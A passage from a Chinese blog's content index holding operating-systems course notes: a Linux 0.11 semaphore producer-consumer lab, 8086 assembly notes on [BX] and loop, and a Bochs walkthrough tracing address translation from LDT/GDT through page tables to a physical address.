Makefile截图如下:\n7.挂载hdc并准备相关文件 进入oslab根目录执行sudo ./mount-hdc，随后将unistd.h复制到usr/include下，将sem.h复制到usr/include/linux下，最后使用sudo umount hdc卸载hdc\n二、编写生产者-消费者检验程序 1.新建pc.c文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 #define __LIBRARY__ #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;linux/sem.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;linux/sched.h\u0026gt; _syscall2(sem_t *,sem_open,const char *,name,unsigned int,value) _syscall1(int,sem_wait,sem_t *,sem) _syscall1(int,sem_post,sem_t *,sem) _syscall1(int,sem_unlink,const char *,name) const char *FILENAME = \u0026#34;/usr/root/buffer_file\u0026#34;; /* 消费生产的产品存放的缓冲文件的路径 */ const int NR_CONSUMERS = 5; /* 消费者的数量 */ const int NR_ITEMS = 50; /* 产品的最大量 */ const int BUFFER_SIZE = 10; /* 缓冲区大小，表示可同时存在的产品数量 */ sem_t *metux, *full, *empty; /* 3个信号量 */ unsigned int item_pro, item_used; /* 刚生产的产品号；刚消费的产品号 */ int fi, fo; /* 供生产者写入或消费者读取的缓冲文件的句柄 */ int main(int argc, char *argv[]) { char *filename; int pid; int i; filename = argc \u0026gt; 1 ? argv[1] : FILENAME; /* O_TRUNC 表示：当文件以只读或只写打开时，若文件存在，则将其长度截为0（即清空文件） * 0222 和 0444 分别表示文件只写和只读（前面的0是八进制标识） */ fi = open(filename, O_CREAT| O_TRUNC| O_WRONLY, 0222); /* 以只写方式打开文件给生产者写入产品编号 */ fo = open(filename, O_TRUNC| O_RDONLY, 0444); /* 以只读方式打开文件给消费者读出产品编号 */ metux = sem_open(\u0026#34;METUX\u0026#34;, 1); /* 互斥信号量，防止生产消费同时进行 */ full = sem_open(\u0026#34;FULL\u0026#34;, 0); /* 产品剩余信号量，大于0则可消费 */ empty = sem_open(\u0026#34;EMPTY\u0026#34;, BUFFER_SIZE); /* 空信号量，它与产品剩余信号量此消彼长，大于0时生产者才能继续生产 */ item_pro = 0; if ((pid = fork())) /* 父进程用来执行消费者动作 */ { printf(\u0026#34;pid %d:\\tproducer created....\\n\u0026#34;, pid); /* printf()输出的信息会先保存到输出缓冲区，并没有马上输出到标准输出（通常为终端控制台）。 * 为避免偶然因素的影响，我们每次printf()都调用一下stdio.h中的fflush(stdout) * 来确保将输出立刻输出到标准输出。 */ fflush(stdout); while (item_pro \u0026lt;= NR_ITEMS) /* 生产完所需产品 */ { sem_wait(empty); sem_wait(metux); /* 生产完一轮产品（文件缓冲区只能容纳BUFFER_SIZE个产品编号）后 * 将缓冲文件的位置指针重新定位到文件首部。 */ if(!(item_pro % BUFFER_SIZE)) lseek(fi, 0, 0); write(fi, (char *) \u0026amp;item_pro, sizeof(item_pro)); /* 写入产品编号 */ printf(\u0026#34;pid %d:\\tproduces item %d\\n\u0026#34;, pid, item_pro); fflush(stdout); item_pro++; sem_post(metux); sem_post(full); /* 唤醒消费者进程 */ } } else /* 子进程来创建消费者 */ { i = NR_CONSUMERS; while(i--) { if(!(pid=fork())) /* 创建i个消费者进程 */ { pid = getpid(); printf(\u0026#34;pid %d:\\tconsumer %d created....\\n\u0026#34;, pid, NR_CONSUMERS-i); fflush(stdout); while(1) { sem_wait(full); sem_wait(metux); /* read()读到文件末尾时返回0，将文件的位置指针重新定位到文件首部 */ if(!read(fo, (char *)\u0026amp;item_used, sizeof(item_used))) { lseek(fo, 0, 0); read(fo, (char *)\u0026amp;item_used, sizeof(item_used)); } printf(\u0026#34;pid %d:\\tconsumer %d consumes item %d\\n\u0026#34;, pid, NR_CONSUMERS-i+1, item_used); fflush(stdout); sem_post(metux); sem_post(empty); /* 唤醒生产者进程 */ if(item_used == NR_ITEMS) /* 如果已经消费完最后一个商品，则结束 */ goto OK; } } } } OK: close(fi); close(fo); return 0; } 将此文件移动到usr/root目录下，此目录需要挂载hdc才可以访问。移动成功之后直接重新编译linux并在虚拟环境内运行。\n2.编译运行pc.c 运行linux-0.11之后，首先编译pc.c，使用命令gcc -o pc pc.c，随后运行pc，使用命令**./pc \u0026gt; sem_output**即可，最终在虚拟环境内输入sync把修改的数据写入磁盘。\n遇到的问题(还没解决) 上面报了一个类型转换的异常，定义和调用sem_open的地方如下，但是没有发现哪个地方写错了\n3.查看sem_output 首先挂载hdc，然后进入usr/root目录并在终端内执行sudo less sem_output命令，可看到下图结果：\n4.对比有无信号量 删除pc.c文件中关于信号量的代码，重新编译运行后得出如下结果\n回答问题 在有无信号量的不同条件下对比运行结果后可以发现，如果去掉所有与信号量有关的代码，编译运行程序之后可以发现输出的数字顺序完全混乱。 信号量不存在的情况下，进程之间无法同步或者协作，造成此种情况的有如下原因：\n一种情况是缓冲区满了，生产者还在写入数据，会造覆盖掉部分数据。 一种是缓冲区为空，消费者尝试读取数据，读到的数据是已输出的数据。 多个进程对文件缓冲区同时访问，造成了程序崩溃。 ","permalink":"https://chance7bin.github.io/posts/basic/os-lab/%E5%AE%9E%E9%AA%8C6-%E4%BF%A1%E5%8F%B7%E9%87%8F%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%92%8C%E5%BA%94%E7%94%A8/","summary":"1.实验目的 加深对进程同步与互斥概念的认识； 掌握信号量的使用，并应用它解决生产者——消费者问题； 掌握信号量的实现原理。 2.实验内容 本次实验的","title":"实验6 信号量的实现和应用"},{"content":"为了描述上的简洁，使用一个描述性的符号“()”来表示一个寄存器或一个内存单元中的内容。比如：\n(ax)表示ax中的内容、(al)表示al中的内容；\n(20000H)表示内存20000H单元的内容（()中的内存单元的地址为物理地址）;\n((ds)*16+(bx))表示： ds 中的内容为ADR1，bx中的内容为ADR2，内存ADR1×16+ADR2单元的内容。\n也可以理解为： ds中的ADR1作为段地址，bx中的ADR2作为偏移地址，内存ADR1:ADR2单元的内容。\n注意，“( )”中的元素可以有3种类型：①寄存器名；②段寄存器名；③内存单元的物理地址(一个20位数据)。比如：\n(ax)、(ds)、(al)、(cx)、(20000H)、((ds)*16+(bx))等是正确的用法；\n(2000:0)、((ds):1000H)等是不正确的用法。\n“(X)”所表示的数据有两种类型：①字节；②字。是哪种类型由寄存器名或具体的运算决定，比如：\n(al)、(bl)、(cl)等得到的数据为字节型；(ds)、(ax)、(bx)等得到的数据为字型。\n(al)=(20000H)，则(20000H)得到的数据为字节型；(ax)=(20000H)，则(20000H)得到的数据为字型。\n约定符号idata表示常量\n我们在Debug中写过类似的指令：mov ax,[0]，表示将 ds:0 处的数据送入ax中。指令中，在“[\u0026hellip;]”里用一个常量0表示内存单元的偏移地址。以后，我们用idata表示常量。比如：\nmov ax,[idata]就代表mov ax,[1]、mov ax,[2]、mov ax,[3]等。\nmov bx,idata就代表mov bx,1、mov bx,2、mov bx,3等。\nmov ds,idata就代表mov ds,1、mov ds,2等，它们都是非法指令。\n==SA:EA 是段地址:偏移地址的别名==\n5.1 [BX] mov ax,[bx] 功能： ==bx中存放的数据作为一个偏移地址EA==，段地址SA默认在ds 中，将SA:EA处的数据送入ax中。\n即： (ax)=((ds)*16+(bx))。\n5.2 Loop指令 [CX] loop 指令的格式是： loop标号，CPU 执行loop指令的时候，要进行两步操作，\n①(cx)=(cx)-1;\n②判断cx中的值，不为零则转至标号处执行程序，如果为零则向下执行。\n从上面的过程中，可以总结出用cx和loop指令相配合实现循环功能的3个要点：\n(1)在cx中存放循环次数;\n(2)loop指令中的标号所标识地址要在前面;\n(3)要循环执行的程序段，要写在标号和 loop指令的中间。\n用cx和 loop指令相配合实现循环功能的程序框架如下：\n1 2 3 mov cx,循环次数 s: 循环执行的程序段 loop s 5.3 在Debug中跟踪用loop指令实现的循环程序 [DX:累加寄存器] 用循环累加来实现乘法，用哪个寄存器进行累加？\n将ffff:0006单元中的数赋值给ax，用dx进行累加。先设(dx)=0，然后做3次(dx)=(dx)+(ax)。\n==为什么要把ffff:0006单元中的数先赋值给ax，而不直接在dx中累加呢？==\n（1）ffff:0006中的数据是8位的，不能直接加到16位寄存器dx中\n（2）也不能在dl中累加，因为dl是8位寄存器，能容纳的数据的范围在 0~255 之间，累加后很有可能造成进位丢失。\n所以一种解决方法是得用一个16位寄存器来做中介。将内存单元中的8位数据赋值到一个16位寄存器ax中，再将ax中的数据加到dx上，从而使两个运算对象的类型匹配并且结果不会超界。\n指令mov ax,0ffffh\n我们知道，大于9FFFh 的十六进制数据A000H、A001H\u0026hellip;CO00H、c001H\u0026hellip;FFFEH、FFFFH等，在书写的时候都是以字母开头的。而==在汇编源程序中，数据不能以字母开头，所以要在前面加0==。比如，9138h在汇编源程序中可以直接写为“9138h”，而==A000h在汇编源程序中要写为“0A000h”==。\nDebug -g 0012 直接执行到指定位置 ”-g 0012“它表示执行程序到当前代码段(段地址在CS 中)的0012h处。也就是说“g 0012”将使Debug从当前的CS:IP指向的指令执行，一直到(IP)=0012h 为止。具体的情况如图5.12所示。\n-p 将循环一次执行完 希望将循环一次执行完，可以使用p命令来达到目的。再次遇到loop指令时，使用p命令来执行，Debug就会自动重复执行循环中的指令，直到(cx)=0为止。具体情况如图5.14所示。\n当然，也可以用g命令来达到目的，可以用“g 0016”直接执行到CS:0016处。具体情况如图5.15所示。\n5.4 Debug和汇编编译器masm对指令的不同处理 我们在Debug中和源程序中写入同样形式的指令：“mov al,[0]”、“mov bl,[1]”、“mov cl,[2]”、“mov dl,[3]”，但 Debug和编译器对这些指令中的“[idata]”却有不同的解释。\nDebug 将它解释为“[idata]”是一个内存单元，“idata”是内存单元的偏移地址；\n而编译器将“[idata]”解释为“idata”。\n比较一下汇编源程序中以下指令的含义。\n“mov al,[0]”，含义：(al)=0，将常量0送入al中(与mov al,0含义相同)；\n“mov al,ds:[0]”，含义：(al)=((ds)*16+0)，将内存单元中的数据送入al 中；\n“mov al,[bx]”，含义：(al)=((ds)*16+(bx))，将内存单元中的数据送入al 中；\n“mov al,ds:[bx]”，含义：与“mov al,[bx]”相同。\n从上面的比较中可以看出:\n（1）在汇编源程序中，如果用指令访问一个内存单元，则在指令中必须用“[...]”来表示内存单元，如果在“[]”里用一个常量idata直接给出内存单元的偏移地址，就要在“[]”的前面显式地给出段地址所在的段寄存器。比如\nmov al,ds:[0]\n这些出现在访问内存单元的指令中，用于显式地指明内存单元的段地址的“ds:” “cs:” “ss:” “es:”，在汇编语言中称为段前缀。\n如果没有在“[]”的前面显式地给出段地址所在的段寄存器，比如\nmov al,[0]\n那么，编译器masm将把指令中的“[idata]”解释为“idata”。\n（2）如果在“[]”里用寄存器，比如bx，间接给出内存单元的偏移地址，则段地址默认在ds中。当然，也可以显式地给出段地址所在的段寄存器。\n5.5 loop和[bx]的联合应用 5.7 一段安全的空间 (1)我们需要直接向一段内存中写入内容;\n(2)这段内存空间不应存放系统或其他程序的数据或代码，否则写入操作很可能引发错误;\n(3)DOS 方式下，一般情况，0:200~0:2ff 空间中没有系统或其他程序的数据或代码;\n(4)以后，我们需要直接向一段内存中写入内容时，就使用0:200~0:2ff这段空间。\n5.8 段前缀的使用 将内存 ffff:0~ffff:b 单元中的数据复制到 0:200~0:20b 单元中\n分析：0:200~0:20b 单元等同于 0020:0~0020:b 单元，它们描述的是同一段内存空间。\n因源始单元 ffff:X 和目标单元 0020:X 相距大于64KB，在不同的64KB段里，程序5.8中，每次循环要设置两次ds。这样做是正确的，但是效率不高。我们可以使用两个段寄存器分别存放源始单元 ffff:X 和目标单元 0020:X 的段地址，这样就可以省略循环中需要重复做12次的设置ds的程序段。\n改进的程序如下。\n","permalink":"https://chance7bin.github.io/posts/basic/asm/%E7%AC%AC5%E7%AB%A0-bx%E5%92%8Cloop%E6%8C%87%E4%BB%A4/","summary":"为了描述上的简洁，使用一个描述性的符号“()”来表示一个寄存器或一个内存单元中的内容。比如： (ax)表示ax中的内容、(al)表示al中的内","title":"第5章 [BX]和loop指令"},{"content":"1.实验目的 深入理解操作系统的段、页式内存管理，深入理解段表、页表、逻辑地址、线性地址、物理地址等概念； 实践段、页式内存管理的地址映射过程； 编程实现段、页式内存管理上的内存共享，从而深入理解操作系统的内存管理。 2.实验内容 本次实验的基本内容是：\n用 Bochs 调试工具跟踪 Linux 0.11 的地址翻译（地址映射）过程，了解 IA-32 和 Linux 0.11 的内存管理机制； 在 Ubuntu 上编写多进程的生产者—消费者程序，用共享内存做缓冲区； 在信号量实验的基础上，为 Linux 0.11 增加共享内存功能，并将生产者—消费者程序移植到 Linux 0.11。 2.1 跟踪地址翻译过程 首先以汇编级调试的方式启动 Bochs，引导 Linux 0.11，在 0.11 下编译和运行 test.c。它是一个无限循环的程序，永远不会主动退出。然后在调试器中通过查看各项系统参数，从逻辑地址、LDT 表、GDT 表、线性地址到页表，计算出变量 i 的物理地址。最后通过直接修改物理内存的方式让 test.c 退出运行。\ntest.c 的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int i = 0x12345678; int main(void) { printf(\u0026#34;The logical/virtual address of i is 0x%08x\u0026#34;, \u0026amp;i); fflush(stdout); while (i) ; return 0; } 2.2 基于共享内存的生产者—消费者程序 本项实验在 Ubuntu 下完成，与信号量实验中的 pc.c 的功能要求基本一致，仅有两点不同：\n不用文件做缓冲区，而是使用共享内存； 生产者和消费者分别是不同的程序。生产者是 producer.c，消费者是 consumer.c。两个程序都是单进程的，通过信号量和缓冲区进行通信。 Linux 下，可以通过 shmget() 和 shmat() 两个系统调用使用共享内存。\n2.3 共享内存的实现 进程之间可以通过页共享进行通信，被共享的页叫做共享内存，结构如下图所示：\n图 1 进程间共享内存的结构\n本部分实验内容是在 Linux 0.11 上实现上述页面共享，并将上一部分实现的 producer.c 和 consumer.c 移植过来，验证页面共享的有效性。\n具体要求在 mm/shm.c 中实现 shmget() 和 shmat() 两个系统调用。它们能支持 producer.c 和 consumer.c 的运行即可，不需要完整地实现 POSIX 所规定的功能。\nshmget() 1 int shmget(key_t key, size_t size, int shmflg); shmget() 会新建/打开一页内存，并返回该页共享内存的 shmid（该块共享内存在操作系统内部的 id）。\n所有使用同一块共享内存的进程都要使用相同的 key 参数。\n如果 key 所对应的共享内存已经建立，则直接返回 shmid。如果 size 超过一页内存的大小，返回 -1，并置 errno 为 EINVAL。如果系统无空闲内存，返回 -1，并置 errno 为 ENOMEM。\nshmflg 参数可忽略。\nshmat() 1 void *shmat(int shmid, const void *shmaddr, int shmflg); shmat() 会将 shmid 指定的共享页面映射到当前进程的虚拟地址空间中，并将其首地址返回。\n如果 shmid 非法，返回 -1，并置 errno 为 EINVAL。\nshmaddr 和 shmflg 参数可忽略。\n3.实验报告 完成实验后，在实验报告中回答如下问题：\n对于地址映射实验部分，列出你认为最重要的那几步（不超过 4 步），并给出你获得的实验数据。 test.c 退出后，如果马上再运行一次，并再进行地址跟踪，你发现有哪些异同？为什么？ 4.实验提示 本次需要完成的内容：\n（1）用 Bochs 调试工具跟踪 Linux 0.11 的地址翻译（地址映射）过程，了解 IA-32 和 Linux 0.11 的内存管理机制； （2）在 Ubuntu 上编写多进程的生产者—消费者程序，用共享内存做缓冲区； （3）在信号量实验的基础上，为 Linux 0.11 增加共享内存功能，并将生产者—消费者程序移植到 Linux 0.11。 4.1 IA-32 的地址翻译过程 Linux 0.11 完全遵循 IA-32（Intel Architecture 32-bit）架构进行地址翻译，Windows、后续版本的 Linux 以及一切在 IA-32 保护模式下运行的操作系统都遵循此架构。因为只有这样才能充分发挥 CPU 的 MMU（内存管理单元） 的功能。\n关于此地址翻译过程的细节，请参考《注释》一书中的 5.3.1-5.3.4 节。\n4.2 用 Bochs 汇编级调试功能进行人工地址翻译 此过程比较机械，基本不消耗脑细胞，做一下有很多好处。\n==Bochs命令==\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 [内存操作] x /nuf [addr] 显示线性地址的内容 xp /nuf [addr] 显示物理地址的内容 n 显示的单元数 u 每个显示单元的大小，u可以是下列之一： b BYTE h WORD w DWORD g DWORD64 注意: 这种命名法是按照GDB习惯的，而并不是按照inter的规范。 f 显示格式，f可以是下列之一： x 按照十六进制显示 d 十进制显示 u 按照无符号十进制显示 o 按照八进制显示 t 按照二进制显示 c 按照字符显示 n、f、u是可选参数，如果不指定，则u默认是w，f默认是x。如果前面使用过x或 者xp命令，会按照上一次的x或者xp命令所使用的值。n默认为1。addr 也是一个 可选参数，如果不指定，addr是0，如过前面使用过x或者xp命令，指定了n=i， 则再次执行时n默认为i+1。 setpmem [addr] [size] [val] 设置物理内存某地址的内容。 （1）准备 编译好 Linux 0.11 后，首先通过运行 ./dbg-asm 启动调试器，此时 Bochs 的窗口处于黑屏状态\n而命令行窗口显示：\n1 2 3 4 5 6 7 8 9 10 ======================================================================== Bochs x86 Emulator 2.3.7 Build from CVS snapshot, on June 3, 2008 ======================================================================== 00000000000i[ ] reading configuration from ./bochs/bochsrc.bxrc 00000000000i[ ] installing x module as the Bochs GUI 00000000000i[ ] using log file ./bochsout.txt Next at t=0 (0) [0xfffffff0] f000:fff0 (unk. ctxt): jmp far f000:e05b ; ea5be000f0 \u0026lt;bochs:1\u0026gt;_ Next at t=0 表示下面的指令是 Bochs 启动后要执行的第一条软件指令。\n单步跟踪进去就能看到 BIOS 的代码。不过这不是本实验需要的。直接输入命令 c，continue 程序的运行，Bochs 一如既往地启动了 Linux 0.11。\n在 Linux 0.11 下输入（或拷入）test.c（代码在本实验的第 3 小节中），编译为 test，运行之，打印如下信息：\n1 The logical/virtual address of i is 0x00003004 只要 test 不变，0x00003004 这个值在任何人的机器上都是一样的。即使在同一个机器上多次运行 test，也是一样的。\ntest 是一个死循环，只会不停占用 CPU，不会退出。\n（2）暂停 当 test 运行的时候，在命令行窗口按 Ctrl+c，Bochs 会暂停运行，进入调试状态。绝大多数情况下都会停在 test 内，显示类似如下信息：\n1 (0) [0x00fc8031] 000f:00000031 (unk. ctxt): cmp dword ptr ds:0x3004, 0x00000000 ; 833d0430000000 其中的 000f 如果是 0008，则说明中断在了内核里。那么就要 c，然后再 ctrl+c，直到变为 000f 为止。\n如果显示的下一条指令不是 cmp ...（这里指语句以 cmp 开头），就用 n 命令单步运行几步，直到停在 cmp ...。\n使用命令 u /8，显示从当前位置开始 8 条指令的反汇编代码，结构如下：\n1 2 3 4 5 6 7 8 9 \u0026lt;bochs:3\u0026gt; u /8 10000063: ( ): cmp dword ptr ds:0x3004, 0x00000000 ; 833d0430000000 1000006a: ( ): jz .+0x00000004 ; 7404 1000006c: ( ): jmp .+0xfffffff5 ; ebf5 1000006e: ( ): add byte ptr ds:[eax], al ; 0000 10000070: ( ): xor eax, eax ; 31c0 10000072: ( ): jmp .+0x00000000 ; eb00 10000074: ( ): leave ; c9 10000075: ( ): ret ; c3 这就是 test.c 中从 while 开始一直到 return 的汇编代码。变量 i 保存在 ds:0x3004 这个地址，并不停地和 0 进行比较，直到它为 0，才会跳出循环。\n现在，开始寻找 ds:0x3004 对应的物理地址。\n4.3 段表 ds:0x3004 是虚拟地址，ds 表明这个地址属于 ds 段。首先要找到段表，然后通过 ds 的值在段表中找到 ds 段的具体信息，才能继续进行地址翻译。\n每个在 IA-32 上运行的应用程序都有一个段表，叫 LDT，段的信息叫段描述符。\nLDT 在哪里呢？ldtr 寄存器是线索的起点，通过它可以在 GDT（全局描述符表）中找到 LDT 的物理地址。\n用 sreg 命令（是在调试窗口输入）：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;bochs:4\u0026gt; sreg cs:s=0x000f, dl=0x00000002, dh=0x10c0fa00, valid=1 ds:s=0x0017, dl=0x00003fff, dh=0x10c0f300, valid=3 ss:s=0x0017, dl=0x00003fff, dh=0x10c0f300, valid=1 es:s=0x0017, dl=0x00003fff, dh=0x10c0f300, valid=1 fs:s=0x0017, dl=0x00003fff, dh=0x10c0f300, valid=1 gs:s=0x0017, dl=0x00003fff, dh=0x10c0f300, valid=1 ldtr:s=0x0068, dl=0xa2d00068, dh=0x000082fa, valid=1 tr:s=0x0060, dl=0xa2e80068, dh=0x00008bfa, valid=1 gdtr:base=0x00005cb8, limit=0x7ff idtr:base=0x000054b8, limit=0x7ff 可以看到 ldtr 的值是 0x0068=0000000001101000（二进制），表示 LDT 表存放在 GDT 表的 1101（二进制）=13（十进制）号位置（每位数据的意义参考后文叙述的段选择子）。\n而 GDT 的位置已经由 gdtr 明确给出，在物理地址的 0x00005cb8。\n用 xp /32w 0x00005cb8 查看从该地址开始，32 个字的内容，及 GDT 表的前 16 项，如下：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;bochs:5\u0026gt; xp /32w 0x00005cb8 [bochs]: 0x00005cb8 \u0026lt;bogus+ 0\u0026gt;: 0x00000000 0x00000000 0x00000fff 0x00c09a00 0x00005cc8 \u0026lt;bogus+ 16\u0026gt;: 0x00000fff 0x00c09300 0x00000000 0x00000000 0x00005cd8 \u0026lt;bogus+ 32\u0026gt;: 0xa4280068 0x00008901 0xa4100068 0x00008201 0x00005ce8 \u0026lt;bogus+ 48\u0026gt;: 0xf2e80068 0x000089ff 0xf2d00068 0x000082ff 0x00005cf8 \u0026lt;bogus+ 64\u0026gt;: 0xd2e80068 0x000089ff 0xd2d00068 0x000082ff 0x00005d08 \u0026lt;bogus+ 80\u0026gt;: 0x12e80068 0x000089fc 0x12d00068 0x000082fc 0x00005d18 \u0026lt;bogus+ 96\u0026gt;: 0xa2e80068 0x00008bfa 0xa2d00068 0x000082fa 0x00005d28 \u0026lt;bogus+ 112\u0026gt;: 0xc2e80068 0x000089f8 0xc2d00068 0x000082f8 GDT 表中的每一项占 64 位（8 个字节），所以我们要查找的项的地址是 0x00005cb8+13*8。\n输入 xp /2w 0x00005cb8+13*8，得到：\n1 2 3 \u0026lt;bochs:6\u0026gt; xp /2w 0x00005cb8+13*8 [bochs]: 0x00005d20 \u0026lt;bogus+ 0\u0026gt;: 0xa2d00068 0x000082fa 上两步看到的数值可能和这里给出的示例不一致，这是很正常的。如果想确认是否准确，就看 sreg 输出中，ldtr 所在行里，dl 和 dh 的值，它们是 Bochs 的调试器自动计算出的，你寻找到的必须和它们一致。\n“0xa2d00068 0x000082fa” 将其中的加粗数字组合为“0x00faa2d0”，这就是 LDT 表的物理地址（为什么这么组合，参考后文介绍的段描述符）。\nxp /8w 0x00faa2d0，得到：\n1 2 3 4 \u0026lt;bochs:7\u0026gt; xp /8w 0x00faa2d0 [bochs]: 0x00faa2d0 \u0026lt;bogus+ 0\u0026gt;: 0x00000000 0x00000000 0x00000002 0x10c0fa00 0x00faa2e0 \u0026lt;bogus+ 16\u0026gt;: 0x00003fff 0x10c0f300 0x00000000 0x00fab000 这就是 LDT 表的前 4 项内容了。\n4.4 段描述符 在保护模式下，段寄存器有另一个名字，叫段选择子，因为它保存的信息主要是该段在段表里索引值，用这个索引值可以从段表中“选择”出相应的段描述符。\n先看看 ds 选择子的内容，还是用 sreg 命令：\n1 2 3 4 5 6 7 8 9 10 11 \u0026lt;bochs:8\u0026gt; sreg cs:s=0x000f, dl=0x00000002, dh=0x10c0fa00, valid=1 ds:s=0x0017, dl=0x00003fff, dh=0x10c0f300, valid=3 ss:s=0x0017, dl=0x00003fff, dh=0x10c0f300, valid=1 es:s=0x0017, dl=0x00003fff, dh=0x10c0f300, valid=1 fs:s=0x0017, dl=0x00003fff, dh=0x10c0f300, valid=1 gs:s=0x0017, dl=0x00003fff, dh=0x10c0f300, valid=1 ldtr:s=0x0068, dl=0xa2d00068, dh=0x000082fa, valid=1 tr:s=0x0060, dl=0xa2e80068, dh=0x00008bfa, valid=1 gdtr:base=0x00005cb8, limit=0x7ff idtr:base=0x000054b8, limit=0x7ff 可以看到，ds 的值是 0x0017。段选择子是一个 16 位寄存器，它各位的含义如下图：\n图 2 段选择子的结构\n其中 RPL 是请求特权级，当访问一个段时，处理器要检查 RPL 和 CPL（放在 cs 的位 0 和位 1 中，用来表示当前代码的特权级），即使程序有足够的特权级（CPL）来访问一个段，但如果 RPL（如放在 ds 中，表示请求数据段）的特权级不足，则仍然不能访问，即如果 RPL 的数值大于 CPL（数值越大，权限越小），则用 RPL 的值覆盖 CPL 的值。\n而段选择子中的 TI 是表指示标记，如果 TI=0，则表示段描述符（段的详细信息）在 GDT（全局描述符表）中，即去 GDT 中去查；而 TI=1，则去 LDT（局部描述符表）中去查。\n看看上面的 ds，0x0017=0000000000010111（二进制），所以 RPL=11，可见是在最低的特权级（因为在应用程序中执行），TI=1，表示查找 LDT 表，索引值为 10（二进制）= 2（十进制），表示找 LDT 表中的第 3 个段描述符（从 0 开始编号）。\nLDT 和 GDT 的结构一样，每项占 8 个字节。所以第 3 项 0x00003fff 0x10c0f300（上一步骤的最后一个输出结果中） 就是搜寻好久的 ds 的段描述符了。\n用 sreg 输出中 ds 所在行的 dl 和 dh 值可以验证找到的描述符是否正确。\n接下来看看段描述符里面放置的是什么内容：\n图 3 段描述符的结构\n可以看到，段描述符是一个 64 位二进制的数，存放了段基址和段限长等重要的数据。其中位 P（Present）是段是否存在的标记；位 S 用来表示是系统段描述符（S=0）还是代码或数据段描述符（S=1）；四位 TYPE 用来表示段的类型，如数据段、代码段、可读、可写等；DPL 是段的权限，和 CPL、RPL 对应使用；位 G 是粒度，G=0 表示段限长以位为单位，G=1 表示段限长以 4KB 为单位；其他内容就不详细解释了。\n4.5 段基址和线性地址 费了很大的劲，实际上我们需要的只有段基址一项数据，即段描述符 “0x00003fff 0x10c0f300” 中加粗部分组合成的 “0x10000000”。这就是 ds 段在线性地址空间中的起始地址。用同样的方法也可以算算其它段的基址，都是这个数。\n段基址+段内偏移，就是线性地址了。所以 ds:0x3004 的线性地址就是：\n1 0x10000000 + 0x3004 = 0x10003004 用 calc ds:0x3004 命令可以验证这个结果。\n4.6 页表 从线性地址计算物理地址，需要查找页表。线性地址变成物理地址的过程如下：\n图 4 页表工作原理\n线性地址变成物理地址\n首先需要算出线性地址中的页目录号、页表号和页内偏移，它们分别对应了 32 位线性地址的 10 位 + 10 位 + 12 位，所以==0x10003004 的页目录号是 64，页号 3，页内偏移是 4==。\nIA-32 下，页目录表的位置由 CR3 寄存器指引。“creg”命令可以看到：\n1 2 3 4 5 6 CR0=0x8000001b: PG cd nw ac wp ne ET TS em MP PE CR2=page fault laddr=0x10002f68 CR3=0x00000000 PCD=page-level cache disable=0 PWT=page-level writes transparent=0 CR4=0x00000000: osxmmexcpt osfxsr pce pge mce pae pse de tsd pvi vme 说明页目录表的基址为 0。看看其内容，“xp /68w 0”：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 0x00000000 : 0x00001027 0x00002007 0x00003007 0x00004027 0x00000010 : 0x00000000 0x00024764 0x00000000 0x00000000 0x00000020 : 0x00000000 0x00000000 0x00000000 0x00000000 0x00000030 : 0x00000000 0x00000000 0x00000000 0x00000000 0x00000040 : 0x00ffe027 0x00000000 0x00000000 0x00000000 0x00000050 : 0x00000000 0x00000000 0x00000000 0x00000000 0x00000060 : 0x00000000 0x00000000 0x00000000 0x00000000 0x00000070 : 0x00000000 0x00000000 0x00000000 0x00000000 0x00000080 : 0x00ff3027 0x00000000 0x00000000 0x00000000 0x00000090 : 0x00000000 0x00000000 0x00000000 0x00000000 0x000000a0 : 0x00000000 0x00000000 0x00000000 0x00000000 0x000000b0 : 0x00000000 0x00000000 0x00000000 0x00ffb027 0x000000c0 : 0x00ff6027 0x00000000 0x00000000 0x00000000 0x000000d0 : 0x00000000 0x00000000 0x00000000 0x00000000 0x000000e0 : 0x00000000 0x00000000 0x00000000 0x00000000 0x000000f0 : 0x00000000 0x00000000 0x00000000 0x00ffa027 0x00000100 : 0x00faa027 0x00000000 0x00000000 0x00000000 页目录表和页表中的内容很简单，是 1024 个 32 位（正好是 4K）数。这 32 位中前 20 位是物理页框号，后面是一些属性信息（其中最重要的是最后一位 P）。其中第 65 个页目录项就是我们要找的内容，用“xp /w 0+64*4”查看：\n1 0x00000100 : 0x00faa027 其中的 027 是属性，显然 P=1，其他属性实验者自己分析吧。页表所在物理页框号为 0x00faa，即页表在物理内存的 0x00faa000 位置。从该位置开始查找 3 号页表项，得到（xp /w 0x00faa000+3*4）：\n1 0x00faa00c : 0x00fa7067 其中 067 是属性，显然 P=1，应该是这样。\n4.7 物理地址 最终结果马上就要出现了！\n线性地址 0x10003004 对应的物理页框号为 0x00fa7，和页内偏移 0x004 接到一起，得到 0x00fa7004，这就是变量 i 的物理地址。可以通过两种方法验证。\n第一种方法是用命令 page 0x10003004，可以得到信息：\n1 linear page 0x10003000 maps to physical page 0x00fa7000 第二种方法是用命令 xp /w 0x00fa7004，可以看到：\n1 0x00fa7004 : 0x12345678 这个数值确实是 test.c 中 i 的初值。\n现在，通过直接修改内存来改变 i 的值为 0，命令是： setpmem 0x00fa7004 4 0，表示从 0x00fa7004 地址开始的 4 个字节都设为 0。然后再用“c”命令继续 Bochs 的运行，可以看到 test 退出了，说明 i 的修改成功了，此项实验结束。\n4.8 在 Linux 0.11 中实现共享内存 （1）Linux 中的共享内存 Linux 支持两种方式的共享内存。一种方式是 shm_open()、mmap() 和 shm_unlink() 的组合；另一种方式是 shmget()、shmat() 和 shmdt() 的组合。本实验建议使用后一种方式。\n这些系统调用的详情，请查阅 man 